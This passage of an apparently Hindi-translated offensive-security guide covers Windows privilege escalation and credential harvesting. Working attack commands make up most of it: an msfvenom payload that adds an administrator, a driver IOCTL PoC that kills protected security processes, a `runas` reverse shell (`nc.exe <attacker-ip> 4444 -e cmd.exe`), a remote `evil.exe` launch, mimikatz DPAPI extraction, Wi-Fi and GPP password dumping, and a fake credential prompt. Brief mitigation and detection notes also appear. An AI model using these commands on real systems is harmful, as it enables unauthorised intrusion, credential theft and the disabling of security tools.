gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप पता लगा सकते हैं और exploit कर सकते हैं** इस vulnerability को metasploit के साथ: `exploit/windows/local/trusted_service_path`  
आप metasploit का उपयोग करके मैन्युअल रूप से एक सर्विस बाइनरी बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि किसी service के फेल होने पर कौन सी क्रियाएँ की जाएँ। इस फीचर को एक binary की ओर कॉन्फ़िगर किया जा सकता है। यदि यह binary replaceable है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [आधिकारिक दस्तावेज़](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## एप्लिकेशन

### स्थापित एप्लिकेशन

जाँचें **binaries की permissions** (शायद आप किसी binary को overwrite कर के privilege escalation कर सकें) और **फ़ोल्डरों** की ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

जाँच करें कि क्या आप किसी config file को संशोधित करके किसी विशेष file को पढ़ सकते हैं, या क्या आप किसी binary को संशोधित कर सकते हैं जिसे Administrator account द्वारा (schedtasks) execute किया जाएगा।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएँ

**जाँच करें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जो किसी different user द्वारा execute किया जाएगा।**\
**पढ़ें** the **निम्नलिखित पृष्ठ** ताकि आप दिलचस्प **autoruns locations to escalate privileges** के बारे में और जान सकें:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- जब आप ऐसे device objects बनाते हैं जिन्हें DACL द्वारा प्रतिबंधित किया जाना है, तब हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- privileged operations के लिए caller context को validate करें। process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

Detection ideas for defenders
- संदिग्ध device names (e.g., \\ .\\amsdk*) के user-mode opens और दुरुपयोग संकेत देने वाले विशिष्ट IOCTL sequences की निगरानी करें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) को लागू करें और अपनी allow/deny lists बनाए रखें।


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग कैसे करें इसके बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file पर हार्डकोड किए गए अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहरी ओर से **प्रतिबंधित सेवाओं** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग टेबल
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall नियम

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करें, नियम बनाएं, बंद करें, बंद करें...)**

और[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` भी `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में पाया जा सकता है

यदि आपको root user मिल जाता है तो आप किसी भी पोर्ट पर listen कर सकते हैं (जब आप पहली बार `nc.exe` का उपयोग किसी पोर्ट पर listen करने के लिए करते हैं तो यह GUI के माध्यम से पूछेगा कि क्या `nc` को firewall द्वारा अनुमति दी जानी चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को root के रूप में आसानी से शुरू करने के लिए, आप `--default-user root` आजमा सकते हैं

आप `WSL` फ़ाइल सिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault सर्वरों, वेबसाइटों और अन्य प्रोग्रामों के लिए उपयोगकर्ता क्रेडेंशियल्स स्टोर करता है जिन्हें **Windows** **उपयोगकर्ताओं को स्वतः लॉग इन कराने के लिए**y. पहली नज़र में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook credentials, Twitter credentials, Gmail credentials आदि यहाँ स्टोर कर सकते हैं ताकि वे ब्राउज़र के माध्यम से स्वतः लॉग इन हो सकें। पर ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को स्टोर करता है जिनके जरिए Windows उपयोगकर्ताओं को स्वतः लॉग इन कर सकता है, जिसका मतलब यह है कि कोई भी **Windows application that needs credentials to access a resource** (server या वेबसाइट) **can make use of this Credential Manager** और Windows Vault का उपयोग कर सकता है और उपलब्ध कराए गए क्रेडेंशियल्स का प्रयोग कर सकता है, बजाय इसके कि उपयोगकर्ता बार-बार username और password दर्ज करें।

जब तक एप्लिकेशन Credential Manager के साथ इंटरैक्ट नहीं करते, मुझे नहीं लगता कि वे किसी दिए गए संसाधन के लिए क्रेडेंशियल्स का उपयोग कर पाएंगे। इसलिए, यदि आपका एप्लिकेशन vault का उपयोग करना चाहता है, तो उसे किसी न किसी तरह **क्रेडेंशियल मैनेजर के साथ संवाद करना और उस संसाधन के लिए क्रेडेंशियल्स का अनुरोध करना** चाहिए ताकि वे default storage vault से मिल सकें।

मशीन पर स्टोर किए गए क्रेडेंशियल्स की सूची देखने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए credentials का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ उपयोग कर सकते हैं। निम्नलिखित उदाहरण SMB share के माध्यम से एक remote binary को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
दिए गए credential सेट के साथ `runas` का उपयोग करना।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** डेटा के symmetric एन्क्रिप्शन के लिए एक तरीका प्रदान करता है, जो मुख्य रूप से Windows ऑपरेटिंग सिस्टम में asymmetric private keys के symmetric एन्क्रिप्शन के लिए उपयोग किया जाता है। यह एन्क्रिप्शन entropy में महत्वपूर्ण योगदान के लिए user या system secret का उपयोग करता है।

**DPAPI उपयोगकर्ता के लॉगिन सीक्रेट्स से व्युत्पन्न एक symmetric key के माध्यम से keys के एन्क्रिप्शन को सक्षम बनाता है**। सिस्टम-स्तर के एन्क्रिप्शन परिदृश्यों में यह सिस्टम के domain authentication secrets का उपयोग करता है।

Encrypted user RSA keys, by using DPAPI, are stored in the `%APPDATA%\Microsoft\Protect\{SID}` directory, where `{SID}` represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI key, जो उसी फ़ाइल में user's private keys की रक्षा करने वाले master key के साथ सह-स्थित है**, आमतौर पर 64 bytes के रैंडम डेटा का होता है। (यह ध्यान देने योग्य है कि इस डायरेक्टरी तक पहुँच सीमित है, इसलिए CMD में `dir` कमांड से इसकी सामग्री सूचीबद्ध नहीं की जा सकती, हालांकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप उपयुक्त arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग इसे decrypt करने के लिए कर सकते हैं।

**credentials files protected by the master password** सामान्यतः निम्न स्थानों पर स्थित होते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग करके decrypt कर सकते हैं.\
यदि आप root हैं, तो आप `sekurlsa::dpapi` module के साथ **extract many DPAPI** **masterkeys** को **memory** से निकाल सकते हैं।


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का अक्सर उपयोग **scripting** और automation कार्यों के लिए किया जाता है, ताकि encrypted credentials को सुविधाजनक रूप से स्टोर किया जा सके। ये credentials **DPAPI** द्वारा सुरक्षित होते हैं, जिसका सामान्यतः मतलब है कि इन्हें केवल वही user उसी computer पर decrypted कर सकता है जिस पर इन्हें बनाया गया था।

फाइल में मौजूद PS credentials को **decrypt** करने के लिए आप निम्न कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### वाई-फ़ाई
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP Connections

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं

### हाल ही में चलाए गए Commands
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
आप मेमोरी से कई DPAPI masterkeys Mimikatz `sekurlsa::dpapi` module का उपयोग करके निकाल सकते हैं

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग पासवर्ड और अन्य जानकारी **सहेजने** के लिए करते हैं, यह न समझते हुए कि यह एक database file है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित है और इसे खोजने व जाँचने योग्य हमेशा होता है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से पासवर्ड recover करने के लिए आपको Administrator होना चाहिए और इसे High Integrity level पर चलाना होगा.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** configured किए गए हों और इन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँच करें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर **SYSTEM privileges के साथ चलते हैं**, कई इसके लिए संवेदनशील हैं **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys रजिस्ट्री में

SSH private keys `HKCU\Software\OpenSSH\Agent\Keys` रजिस्ट्री की key के अंदर स्टोर हो सकते हैं, इसलिए आपको जाँचना चाहिए कि वहाँ कुछ दिलचस्प है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस path के अंदर कोई entry मिलती है, तो संभवतः यह एक saved SSH key होगी। यह encrypted रूप में संग्रहीत होती है लेकिन [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके इसे आसानी से decrypt किया जा सकता है.\
इस तकनीक के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वचालित रूप से शुरू हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाने की कोशिश की, उन्हें `ssh-add` से जोड़ा और ssh के माध्यम से किसी मशीन में लॉगिन करने की कोशिश की। रजिस्टरी HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### बिना निगरानी फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Search for a file called **SiteList.xml**

### कैश्ड GPP पासवर्ड

एक फीचर पहले उपलब्ध था जो Group Policy Preferences (GPP) के माध्यम से मशीनों के समूह पर custom local administrator accounts तैनात करने की अनुमति देता था। हालांकि, इस तरीके में गंभीर सुरक्षा कमियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फाइलों के रूप में स्टोर होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs में मौजूद पासवर्ड, जो AES256 से encrypt किए गए थे और एक publicly documented default key का उपयोग करते थे, किसी भी authenticated user द्वारा decrypt किए जा सकते थे। यह एक गंभीर जोखिम पैदा करता था क्योंकि इससे users को elevated privileges मिल सकते थे।

इस जोखिम को कम करने के लिए एक function विकसित किया गया जो स्थानीय रूप से cached GPP फाइलों को स्कैन करता है जिनमें "cpassword" फ़ील्ड खाली नहीं होती। ऐसी फ़ाइल मिलने पर फ़ंक्शन पासवर्ड को decrypt कर एक custom PowerShell object लौटाता है। यह object GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जिससे इस सुरक्षा कमजोरी की पहचान और remediation में मदद मिलती है।

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके पासवर्ड प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
web.config में credentials का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसकी credentials या यहाँ तक कि किसी अन्य उपयोगकर्ता की credentials दर्ज करने के लिए कह सकते हैं** यदि आपको लगता है कि वह उन्हें जानता है (ध्यान दें कि क्लाइंट से सीधे **पूछना** और सीधे **credentials** माँगना वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जिनमें credentials शामिल हो सकते हैं**

ऐसी ज्ञात फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में मौजूद थीं
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
